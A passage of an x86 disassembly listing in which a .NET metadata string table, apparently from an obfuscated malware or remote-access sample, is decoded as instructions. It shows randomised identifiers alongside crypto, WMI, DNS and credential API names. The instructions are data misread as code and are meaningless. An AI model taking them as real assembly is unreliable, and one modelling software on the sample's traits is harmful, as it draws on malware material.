  40943b:	67 74 50             	addr16 je 0x40948e
  40943e:	6a 79                	push   $0x79
  409440:	43                   	inc    %ebx
  409441:	6e                   	outsb  %ds:(%esi),(%dx)
  409442:	71 71                	jno    0x4094b5
  409444:	00 70 50             	add    %dh,0x50(%eax)
  409447:	41                   	inc    %ecx
  409448:	6b 61 62 61          	imul   $0x61,0x62(%ecx),%esp
  40944c:	4d                   	dec    %ebp
  40944d:	6b 61 61 6f          	imul   $0x6f,0x61(%ecx),%esp
  409451:	6e                   	outsb  %ds:(%esi),(%dx)
  409452:	77 71                	ja     0x4094c5
  409454:	00 53 47             	add    %dl,0x47(%ebx)
  409457:	4f                   	dec    %edi
  409458:	5a                   	pop    %edx
  409459:	6b 6b 64 49          	imul   $0x49,0x64(%ebx),%ebp
  40945d:	67 4d                	addr16 dec %ebp
  40945f:	61                   	popa
  409460:	4f                   	dec    %edi
  409461:	49                   	dec    %ecx
  409462:	72 00                	jb     0x409464
  409464:	61                   	popa
  409465:	47                   	inc    %edi
  409466:	76 58                	jbe    0x4094c0
  409468:	6d                   	insl   (%dx),%es:(%edi)
  409469:	67 6f                	outsl  %ds:(%si),(%dx)
  40946b:	42                   	inc    %edx
  40946c:	76 4b                	jbe    0x4094b9
  40946e:	72 00                	jb     0x409470
  409470:	43                   	inc    %ebx
  409471:	6c                   	insb   (%dx),%es:(%edi)
  409472:	65 61                	gs popa
  409474:	72 00                	jb     0x409476
  409476:	43                   	inc    %ebx
  409477:	68 61 72 00 6e       	push   $0x6e007261
  40947c:	73 65                	jae    0x4094e3
  40947e:	6f                   	outsl  %ds:(%esi),(%dx)
  40947f:	61                   	popa
  409480:	50                   	push   %eax
  409481:	6e                   	outsb  %ds:(%esi),(%dx)
  409482:	69 4d 56 52 49 45 64 	imul   $0x64454952,0x56(%ebp),%ecx
  409489:	72 00                	jb     0x40948b
  40948b:	49                   	dec    %ecx
  40948c:	6e                   	outsb  %ds:(%esi),(%dx)
  40948d:	76 6f                	jbe    0x4094fe
  40948f:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409493:	6d                   	insl   (%dx),%es:(%edi)
  409494:	62 65 72             	bound  %esp,0x72(%ebp)
  409497:	00 4d 44             	add    %cl,0x44(%ebp)
  40949a:	35 43 72 79 70       	xor    $0x70797243,%eax
  40949f:	74 6f                	je     0x409510
  4094a1:	53                   	push   %ebx
  4094a2:	65 72 76             	gs jb  0x40951b
  4094a5:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094ac:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4094b3:	41 
  4094b4:	43                   	inc    %ebx
  4094b5:	72 79                	jb     0x409530
  4094b7:	70 74                	jo     0x40952d
  4094b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ba:	53                   	push   %ebx
  4094bb:	65 72 76             	gs jb  0x409534
  4094be:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094c5:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4094cc:	73 
  4094cd:	43                   	inc    %ebx
  4094ce:	72 79                	jb     0x409549
  4094d0:	70 74                	jo     0x409546
  4094d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4094d3:	53                   	push   %ebx
  4094d4:	65 72 76             	gs jb  0x40954d
  4094d7:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094de:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094e5:	72 
  4094e6:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094ed:	64 65 72 00          	fs gs jb 0x4094f1
  4094f1:	4d                   	dec    %ebp
  4094f2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094f9:	74 2e                	je     0x409529
  4094fb:	43                   	inc    %ebx
  4094fc:	53                   	push   %ebx
  4094fd:	68 61 72 70 2e       	push   $0x2e707261
  409502:	52                   	push   %edx
  409503:	75 6e                	jne    0x409573
  409505:	74 69                	je     0x409570
  409507:	6d                   	insl   (%dx),%es:(%edi)
  409508:	65 42                	gs inc %edx
  40950a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409511:	61                   	popa
  409512:	6c                   	insb   (%dx),%es:(%edi)
  409513:	6c                   	insb   (%dx),%es:(%edi)
  409514:	53                   	push   %ebx
  409515:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  40951c:	65 
  40951d:	72 00                	jb     0x40951f
  40951f:	67 65 74 5f          	addr16 gs je 0x409582
  409523:	42                   	inc    %edx
  409524:	75 66                	jne    0x40958c
  409526:	66 65 72 00          	data16 gs jb 0x40952a
  40952a:	73 65                	jae    0x409591
  40952c:	74 5f                	je     0x40958d
  40952e:	42                   	inc    %edx
  40952f:	75 66                	jne    0x409597
  409531:	66 65 72 00          	data16 gs jb 0x409535
  409535:	67 65 74 5f          	addr16 gs je 0x409598
  409539:	41                   	inc    %ecx
  40953a:	73 49                	jae    0x409585
  40953c:	6e                   	outsb  %ds:(%esi),(%dx)
  40953d:	74 65                	je     0x4095a4
  40953f:	67 65 72 00          	addr16 gs jb 0x409543
  409543:	73 65                	jae    0x4095aa
  409545:	74 5f                	je     0x4095a6
  409547:	41                   	inc    %ecx
  409548:	73 49                	jae    0x409593
  40954a:	6e                   	outsb  %ds:(%esi),(%dx)
  40954b:	74 65                	je     0x4095b2
  40954d:	67 65 72 00          	addr16 gs jb 0x409551
  409551:	4d                   	dec    %ebp
  409552:	61                   	popa
  409553:	6e                   	outsb  %ds:(%esi),(%dx)
  409554:	61                   	popa
  409555:	67 65 6d             	gs insl (%dx),%es:(%di)
  409558:	65 6e                	outsb  %gs:(%esi),(%dx)
  40955a:	74 4f                	je     0x4095ab
  40955c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40955f:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409563:	61                   	popa
  409564:	72 63                	jb     0x4095c9
  409566:	68 65 72 00 53       	push   $0x53007265
  40956b:	65 73 73             	gs jae 0x4095e1
  40956e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409575:	6e                   	outsb  %ds:(%esi),(%dx)
  409576:	67 45                	addr16 inc %ebp
  409578:	76 65                	jbe    0x4095df
  40957a:	6e                   	outsb  %ds:(%esi),(%dx)
  40957b:	74 48                	je     0x4095c5
  40957d:	61                   	popa
  40957e:	6e                   	outsb  %ds:(%esi),(%dx)
  40957f:	64 6c                	fs insb (%dx),%es:(%edi)
  409581:	65 72 00             	gs jb  0x409584
  409584:	54                   	push   %esp
  409585:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  40958c:	55                   	push   %ebp
  40958d:	70 70                	jo     0x4095ff
  40958f:	65 72 00             	gs jb  0x409592
  409592:	43                   	inc    %ebx
  409593:	75 72                	jne    0x409607
  409595:	72 65                	jb     0x4095fc
  409597:	6e                   	outsb  %ds:(%esi),(%dx)
  409598:	74 55                	je     0x4095ef
  40959a:	73 65                	jae    0x409601
  40959c:	72 00                	jb     0x40959e
  40959e:	53                   	push   %ebx
  40959f:	74 72                	je     0x409613
  4095a1:	65 61                	gs popa
  4095a3:	6d                   	insl   (%dx),%es:(%edi)
  4095a4:	57                   	push   %edi
  4095a5:	72 69                	jb     0x409610
  4095a7:	74 65                	je     0x40960e
  4095a9:	72 00                	jb     0x4095ab
  4095ab:	54                   	push   %esp
  4095ac:	65 78 74             	gs js  0x409623
  4095af:	57                   	push   %edi
  4095b0:	72 69                	jb     0x40961b
  4095b2:	74 65                	je     0x409619
  4095b4:	72 00                	jb     0x4095b6
  4095b6:	45                   	inc    %ebp
  4095b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b8:	74 65                	je     0x40961f
  4095ba:	72 00                	jb     0x4095bc
  4095bc:	42                   	inc    %edx
  4095bd:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4095c4:	72 
  4095c5:	74 65                	je     0x40962c
  4095c7:	72 00                	jb     0x4095c9
  4095c9:	54                   	push   %esp
  4095ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4095cb:	4c                   	dec    %esp
  4095cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4095cd:	77 65                	ja     0x409634
  4095cf:	72 00                	jb     0x4095d1
  4095d1:	49                   	dec    %ecx
  4095d2:	45                   	inc    %ebp
  4095d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d4:	75 6d                	jne    0x409643
  4095d6:	65 72 61             	gs jb  0x40963a
  4095d9:	74 6f                	je     0x40964a
  4095db:	72 00                	jb     0x4095dd
  4095dd:	4d                   	dec    %ebp
  4095de:	61                   	popa
  4095df:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e0:	61                   	popa
  4095e1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095e4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095e6:	74 4f                	je     0x409637
  4095e8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095eb:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095ef:	75 6d                	jne    0x40965e
  4095f1:	65 72 61             	gs jb  0x409655
  4095f4:	74 6f                	je     0x409665
  4095f6:	72 00                	jb     0x4095f8
  4095f8:	53                   	push   %ebx
  4095f9:	79 73                	jns    0x40966e
  4095fb:	74 65                	je     0x409662
  4095fd:	6d                   	insl   (%dx),%es:(%edi)
  4095fe:	2e 43                	cs inc %ebx
  409600:	6f                   	outsl  %ds:(%esi),(%dx)
  409601:	6c                   	insb   (%dx),%es:(%edi)
  409602:	6c                   	insb   (%dx),%es:(%edi)
  409603:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409608:	6e                   	outsb  %ds:(%esi),(%dx)
  409609:	73 2e                	jae    0x409639
  40960b:	49                   	dec    %ecx
  40960c:	45                   	inc    %ebp
  40960d:	6e                   	outsb  %ds:(%esi),(%dx)
  40960e:	75 6d                	jne    0x40967d
  409610:	65 72 61             	gs jb  0x409674
  409613:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  409617:	47                   	inc    %edi
  409618:	65 74 45             	gs je  0x409660
  40961b:	6e                   	outsb  %ds:(%esi),(%dx)
  40961c:	75 6d                	jne    0x40968b
  40961e:	65 72 61             	gs jb  0x409682
  409621:	74 6f                	je     0x409692
  409623:	72 00                	jb     0x409625
  409625:	41                   	inc    %ecx
  409626:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40962a:	61                   	popa
  40962b:	74 6f                	je     0x40969c
  40962d:	72 00                	jb     0x40962f
  40962f:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409634:	00 2e                	add    %ch,(%esi)
  409636:	63 63 74             	arpl   %esp,0x74(%ebx)
  409639:	6f                   	outsl  %ds:(%esi),(%dx)
  40963a:	72 00                	jb     0x40963c
  40963c:	4d                   	dec    %ebp
  40963d:	6f                   	outsl  %ds:(%esi),(%dx)
  40963e:	6e                   	outsb  %ds:(%esi),(%dx)
  40963f:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409646:	65 
  409647:	61                   	popa
  409648:	74 65                	je     0x4096af
  40964a:	44                   	inc    %esp
  40964b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40964f:	70 74                	jo     0x4096c5
  409651:	6f                   	outsl  %ds:(%esi),(%dx)
  409652:	72 00                	jb     0x409654
  409654:	43                   	inc    %ebx
  409655:	72 65                	jb     0x4096bc
  409657:	61                   	popa
  409658:	74 65                	je     0x4096bf
  40965a:	45                   	inc    %ebp
  40965b:	6e                   	outsb  %ds:(%esi),(%dx)
  40965c:	63 72 79             	arpl   %esi,0x79(%edx)
  40965f:	70 74                	jo     0x4096d5
  409661:	6f                   	outsl  %ds:(%esi),(%dx)
  409662:	72 00                	jb     0x409664
  409664:	49                   	dec    %ecx
  409665:	6e                   	outsb  %ds:(%esi),(%dx)
  409666:	74 50                	je     0x4096b8
  409668:	74 72                	je     0x4096dc
  40966a:	00 53 79             	add    %dl,0x79(%ebx)
  40966d:	73 74                	jae    0x4096e3
  40966f:	65 6d                	gs insl (%dx),%es:(%edi)
  409671:	2e 44                	cs inc %esp
  409673:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40967a:	69 63 73 00 71 44 52 	imul   $0x52447100,0x73(%ebx),%esp
  409681:	63 6d 66             	arpl   %ebp,0x66(%ebp)
  409684:	76 62                	jbe    0x4096e8
  409686:	53                   	push   %ebx
  409687:	43                   	inc    %ebx
  409688:	47                   	inc    %edi
  409689:	44                   	inc    %esp
  40968a:	64 73 00             	fs jae 0x40968d
  40968d:	4d                   	dec    %ebp
  40968e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409695:	74 2e                	je     0x4096c5
  409697:	56                   	push   %esi
  409698:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  40969f:	73 69                	jae    0x40970a
  4096a1:	63 2e                	arpl   %ebp,(%esi)
  4096a3:	44                   	inc    %esp
  4096a4:	65 76 69             	gs jbe 0x409710
  4096a7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096aa:	00 53 79             	add    %dl,0x79(%ebx)
  4096ad:	73 74                	jae    0x409723
  4096af:	65 6d                	gs insl (%dx),%es:(%edi)
  4096b1:	2e 52                	cs push %edx
  4096b3:	75 6e                	jne    0x409723
  4096b5:	74 69                	je     0x409720
  4096b7:	6d                   	insl   (%dx),%es:(%edi)
  4096b8:	65 2e 49             	gs cs dec %ecx
  4096bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4096bc:	74 65                	je     0x409723
  4096be:	72 6f                	jb     0x40972f
  4096c0:	70 53                	jo     0x409715
  4096c2:	65 72 76             	gs jb  0x40973b
  4096c5:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096cc:	73 74                	jae    0x409742
  4096ce:	65 6d                	gs insl (%dx),%es:(%edi)
  4096d0:	2e 52                	cs push %edx
  4096d2:	75 6e                	jne    0x409742
  4096d4:	74 69                	je     0x40973f
  4096d6:	6d                   	insl   (%dx),%es:(%edi)
  4096d7:	65 2e 43             	gs cs inc %ebx
  4096da:	6f                   	outsl  %ds:(%esi),(%dx)
  4096db:	6d                   	insl   (%dx),%es:(%edi)
  4096dc:	70 69                	jo     0x409747
  4096de:	6c                   	insb   (%dx),%es:(%edi)
  4096df:	65 72 53             	gs jb  0x409735
  4096e2:	65 72 76             	gs jb  0x40975b
  4096e5:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4096ec:	62 75 67             	bound  %esi,0x67(%ebp)
  4096ef:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4096f6:	65 
  4096f7:	73 00                	jae    0x4096f9
  4096f9:	45                   	inc    %ebp
  4096fa:	78 70                	js     0x40976c
  4096fc:	61                   	popa
  4096fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4096fe:	64 45                	fs inc %ebp
  409700:	6e                   	outsb  %ds:(%esi),(%dx)
  409701:	76 69                	jbe    0x40976c
  409703:	72 6f                	jb     0x409774
  409705:	6e                   	outsb  %ds:(%esi),(%dx)
  409706:	6d                   	insl   (%dx),%es:(%edi)
  409707:	65 6e                	outsb  %gs:(%esi),(%dx)
  409709:	74 56                	je     0x409761
  40970b:	61                   	popa
  40970c:	72 69                	jb     0x409777
  40970e:	61                   	popa
  40970f:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409713:	00 47 65             	add    %al,0x65(%edi)
  409716:	74 50                	je     0x409768
  409718:	72 6f                	jb     0x409789
  40971a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40971d:	73 65                	jae    0x409784
  40971f:	73 00                	jae    0x409721
  409721:	47                   	inc    %edi
  409722:	65 74 48             	gs je  0x40976d
  409725:	6f                   	outsl  %ds:(%esi),(%dx)
  409726:	73 74                	jae    0x40979c
  409728:	41                   	inc    %ecx
  409729:	64 64 72 65          	fs fs jb 0x409792
  40972d:	73 73                	jae    0x4097a2
  40972f:	65 73 00             	gs jae 0x409732
  409732:	53                   	push   %ebx
  409733:	79 73                	jns    0x4097a8
  409735:	74 65                	je     0x40979c
  409737:	6d                   	insl   (%dx),%es:(%edi)
  409738:	2e 53                	cs push %ebx
  40973a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40973e:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409745:	70 
  409746:	74 6f                	je     0x4097b7
  409748:	67 72 61             	addr16 jb 0x4097ac
  40974b:	70 68                	jo     0x4097b5
  40974d:	79 2e                	jns    0x40977d
  40974f:	58                   	pop    %eax
  409750:	35 30 39 43 65       	xor    $0x65433930,%eax
  409755:	72 74                	jb     0x4097cb
  409757:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40975e:	73 00                	jae    0x409760
  409760:	52                   	push   %edx
  409761:	66 63 32             	arpl   %si,(%edx)
  409764:	38 39                	cmp    %bh,(%ecx)
  409766:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  40976a:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409771:	73 00                	jae    0x409773
  409773:	52                   	push   %edx
  409774:	65 61                	gs popa
  409776:	64 41                	fs inc %ecx
  409778:	6c                   	insb   (%dx),%es:(%edi)
  409779:	6c                   	insb   (%dx),%es:(%edi)
  40977a:	42                   	inc    %edx
  40977b:	79 74                	jns    0x4097f1
  40977d:	65 73 00             	gs jae 0x409780
  409780:	47                   	inc    %edi
  409781:	65 74 42             	gs je  0x4097c6
  409784:	79 74                	jns    0x4097fa
  409786:	65 73 00             	gs jae 0x409789
  409789:	43                   	inc    %ebx
  40978a:	53                   	push   %ebx
  40978b:	68 61 72 70 41       	push   $0x41707261
  409790:	72 67                	jb     0x4097f9
  409792:	75 6d                	jne    0x409801
  409794:	65 6e                	outsb  %gs:(%esi),(%dx)
  409796:	74 49                	je     0x4097e1
  409798:	6e                   	outsb  %ds:(%esi),(%dx)
  409799:	66 6f                	outsw  %ds:(%esi),(%dx)
  40979b:	46                   	inc    %esi
  40979c:	6c                   	insb   (%dx),%es:(%edi)
  40979d:	61                   	popa
  40979e:	67 73 00             	addr16 jae 0x4097a1
  4097a1:	43                   	inc    %ebx
  4097a2:	53                   	push   %ebx
  4097a3:	68 61 72 70 42       	push   $0x42707261
  4097a8:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097af:	61                   	popa
  4097b0:	67 73 00             	addr16 jae 0x4097b3
  4097b3:	53                   	push   %ebx
  4097b4:	74 72                	je     0x409828
  4097b6:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097bd:	73 73                	jae    0x409832
  4097bf:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4097c7:	67 45                	addr16 inc %ebp
  4097c9:	76 65                	jbe    0x409830
  4097cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4097cc:	74 41                	je     0x40980f
  4097ce:	72 67                	jb     0x409837
  4097d0:	73 00                	jae    0x4097d2
  4097d2:	49                   	dec    %ecx
  4097d3:	43                   	inc    %ebx
  4097d4:	72 65                	jb     0x40983b
  4097d6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097d9:	74 69                	je     0x409844
  4097db:	61                   	popa
  4097dc:	6c                   	insb   (%dx),%es:(%edi)
  4097dd:	73 00                	jae    0x4097df
  4097df:	73 65                	jae    0x409846
  4097e1:	74 5f                	je     0x409842
  4097e3:	43                   	inc    %ebx
  4097e4:	72 65                	jb     0x40984b
  4097e6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097e9:	74 69                	je     0x409854
  4097eb:	61                   	popa
  4097ec:	6c                   	insb   (%dx),%es:(%edi)
  4097ed:	73 00                	jae    0x4097ef
  4097ef:	45                   	inc    %ebp
  4097f0:	71 75                	jno    0x409867
  4097f2:	61                   	popa
  4097f3:	6c                   	insb   (%dx),%es:(%edi)
  4097f4:	73 00                	jae    0x4097f6
  4097f6:	53                   	push   %ebx
  4097f7:	73 6c                	jae    0x409865
  4097f9:	50                   	push   %eax
  4097fa:	72 6f                	jb     0x40986b
  4097fc:	74 6f                	je     0x40986d
  4097fe:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409801:	73 00                	jae    0x409803
  409803:	53                   	push   %ebx
  409804:	79 73                	jns    0x409879
  409806:	74 65                	je     0x40986d
  409808:	6d                   	insl   (%dx),%es:(%edi)
  409809:	2e 57                	cs push %edi
  40980b:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409812:	46                   	inc    %esi
  409813:	6f                   	outsl  %ds:(%esi),(%dx)
  409814:	72 6d                	jb     0x409883
  409816:	73 00                	jae    0x409818
  409818:	44                   	inc    %esp
  409819:	6e                   	outsb  %ds:(%esi),(%dx)
  40981a:	73 00                	jae    0x40981c
  40981c:	43                   	inc    %ebx
  40981d:	6f                   	outsl  %ds:(%esi),(%dx)
  40981e:	6e                   	outsb  %ds:(%esi),(%dx)
  40981f:	74 61                	je     0x409882
  409821:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409828:	74 65                	je     0x40988f
  40982a:	6d                   	insl   (%dx),%es:(%edi)
  40982b:	2e 43                	cs inc %ebx
  40982d:	6f                   	outsl  %ds:(%esi),(%dx)
  40982e:	6c                   	insb   (%dx),%es:(%edi)
  40982f:	6c                   	insb   (%dx),%es:(%edi)
  409830:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409835:	6e                   	outsb  %ds:(%esi),(%dx)
  409836:	73 00                	jae    0x409838
  409838:	53                   	push   %ebx
  409839:	74 72                	je     0x4098ad
  40983b:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409842:	74 4f                	je     0x409893
  409844:	70 74                	jo     0x4098ba
  409846:	69 6f 6e 73 00 52 58 	imul   $0x58520073,0x6e(%edi),%ebp
  40984d:	74 52                	je     0x4098a1
  40984f:	70 66                	jo     0x4098b7
  409851:	4b                   	dec    %ebx
  409852:	65 6e                	outsb  %gs:(%esi),(%dx)
  409854:	70 73                	jo     0x4098c9
  409856:	00 47 65             	add    %al,0x65(%edi)
  409859:	74 49                	je     0x4098a4
  40985b:	6d                   	insl   (%dx),%es:(%edi)
  40985c:	61                   	popa
  40985d:	67 65 44             	addr16 gs inc %esp
  409860:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409864:	65 72 73             	gs jb  0x4098da
  409867:	00 52 75             	add    %dl,0x75(%edx)
  40986a:	6e                   	outsb  %ds:(%esi),(%dx)
  40986b:	74 69                	je     0x4098d6
  40986d:	6d                   	insl   (%dx),%es:(%edi)
  40986e:	65 48                	gs dec %eax
  409870:	65 6c                	gs insb (%dx),%es:(%edi)
  409872:	70 65                	jo     0x4098d9
  409874:	72 73                	jb     0x4098e9
  409876:	00 53 73             	add    %dl,0x73(%ebx)
  409879:	6c                   	insb   (%dx),%es:(%edi)
  40987a:	50                   	push   %eax
  40987b:	6f                   	outsl  %ds:(%esi),(%dx)
  40987c:	6c                   	insb   (%dx),%es:(%edi)
  40987d:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409884:	72 73                	jb     0x4098f9
  409886:	00 46 69             	add    %al,0x69(%esi)
  409889:	6c                   	insb   (%dx),%es:(%edi)
  40988a:	65 41                	gs inc %ecx
  40988c:	63 63 65             	arpl   %esp,0x65(%ebx)
  40988f:	73 73                	jae    0x409904
  409891:	00 47 65             	add    %al,0x65(%edi)
  409894:	74 43                	je     0x4098d9
  409896:	75 72                	jne    0x40990a
  409898:	72 65                	jb     0x4098ff
  40989a:	6e                   	outsb  %ds:(%esi),(%dx)
  40989b:	74 50                	je     0x4098ed
  40989d:	72 6f                	jb     0x40990e
  40989f:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098a2:	73 00                	jae    0x4098a4
  4098a4:	49                   	dec    %ecx
  4098a5:	50                   	push   %eax
  4098a6:	41                   	inc    %ecx
  4098a7:	64 64 72 65          	fs fs jb 0x409910
  4098ab:	73 73                	jae    0x409920
  4098ad:	00 53 79             	add    %dl,0x79(%ebx)
  4098b0:	73 74                	jae    0x409926
  4098b2:	65 6d                	gs insl (%dx),%es:(%edi)
  4098b4:	2e 4e                	cs dec %esi
  4098b6:	65 74 2e             	gs je  0x4098e7
  4098b9:	53                   	push   %ebx
  4098ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4098bb:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098be:	74 73                	je     0x409933
  4098c0:	00 73 65             	add    %dh,0x65(%ebx)
  4098c3:	74 5f                	je     0x409924
  4098c5:	41                   	inc    %ecx
  4098c6:	72 67                	jb     0x40992f
  4098c8:	75 6d                	jne    0x409937
  4098ca:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098cc:	74 73                	je     0x409941
  4098ce:	00 53 79             	add    %dl,0x79(%ebx)
  4098d1:	73 74                	jae    0x409947
  4098d3:	65 6d                	gs insl (%dx),%es:(%edi)
  4098d5:	45                   	inc    %ebp
  4098d6:	76 65                	jbe    0x40993d
  4098d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098d9:	74 73                	je     0x40994e
  4098db:	00 45 78             	add    %al,0x78(%ebp)
  4098de:	69 73 74 73 00 6e 6b 	imul   $0x6b6e0073,0x74(%ebx),%esi
  4098e5:	49                   	dec    %ecx
  4098e6:	53                   	push   %ebx
  4098e7:	6a 47                	push   $0x47
  4098e9:	4d                   	dec    %ebp
  4098ea:	57                   	push   %edi
  4098eb:	77 73                	ja     0x409960
  4098ed:	00 5a 7a             	add    %bl,0x7a(%edx)
  4098f0:	57                   	push   %edi
  4098f1:	74 77                	je     0x40996a
  4098f3:	4c                   	dec    %esp
  4098f4:	61                   	popa
  4098f5:	52                   	push   %edx
  4098f6:	74 48                	je     0x409940
  4098f8:	74 00                	je     0x4098fa
  4098fa:	61                   	popa
  4098fb:	72 6e                	jb     0x40996b
  4098fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4098fe:	45                   	inc    %ebp
  4098ff:	54                   	push   %esp
  409900:	54                   	push   %esp
  409901:	53                   	push   %ebx
  409902:	62 64 4b 78          	bound  %esp,0x78(%ebx,%ecx,2)
  409906:	4c                   	dec    %esp
  409907:	4c                   	dec    %esp
  409908:	74 00                	je     0x40990a
  40990a:	6a 48                	push   $0x48
  40990c:	6c                   	insb   (%dx),%es:(%edi)
  40990d:	66 69 6a 6e 6b 6f    	imul   $0x6f6b,0x6e(%edx),%bp
  409913:	4a                   	dec    %edx
  409914:	68 51 74 00 43       	push   $0x43007451
  409919:	6f                   	outsl  %ds:(%esi),(%dx)
  40991a:	6e                   	outsb  %ds:(%esi),(%dx)
  40991b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40991e:	00 49 6d             	add    %cl,0x6d(%ecx)
  409921:	61                   	popa
  409922:	67 65 46             	addr16 gs inc %esi
  409925:	6f                   	outsl  %ds:(%esi),(%dx)
  409926:	72 6d                	jb     0x409995
  409928:	61                   	popa
  409929:	74 00                	je     0x40992b
  40992b:	67 65 74 5f          	addr16 gs je 0x40998e
  40992f:	41                   	inc    %ecx
  409930:	73 46                	jae    0x409978
  409932:	6c                   	insb   (%dx),%es:(%edi)
  409933:	6f                   	outsl  %ds:(%esi),(%dx)
  409934:	61                   	popa
  409935:	74 00                	je     0x409937
  409937:	73 65                	jae    0x40999e
  409939:	74 5f                	je     0x40999a
  40993b:	41                   	inc    %ecx
  40993c:	73 46                	jae    0x409984
  40993e:	6c                   	insb   (%dx),%es:(%edi)
  40993f:	6f                   	outsl  %ds:(%esi),(%dx)
  409940:	61                   	popa
  409941:	74 00                	je     0x409943
  409943:	6e                   	outsb  %ds:(%esi),(%dx)
  409944:	77 63                	ja     0x4099a9
  409946:	59                   	pop    %ecx
  409947:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  409949:	52                   	push   %edx
  40994a:	70 52                	jo     0x40999e
  40994c:	55                   	push   %ebp
  40994d:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409951:	61                   	popa
  409952:	6e                   	outsb  %ds:(%esi),(%dx)
  409953:	61                   	popa
  409954:	67 65 6d             	gs insl (%dx),%es:(%di)
  409957:	65 6e                	outsb  %gs:(%esi),(%dx)
  409959:	74 42                	je     0x40999d
  40995b:	61                   	popa
  40995c:	73 65                	jae    0x4099c3
  40995e:	4f                   	dec    %edi
  40995f:	62 6a 65             	bound  %ebp,0x65(%edx)
  409962:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409966:	6f                   	outsl  %ds:(%esi),(%dx)
  409967:	6c                   	insb   (%dx),%es:(%edi)
  409968:	6c                   	insb   (%dx),%es:(%edi)
  409969:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40996e:	6f                   	outsl  %ds:(%esi),(%dx)
  40996f:	6e                   	outsb  %ds:(%esi),(%dx)
  409970:	6e                   	outsb  %ds:(%esi),(%dx)
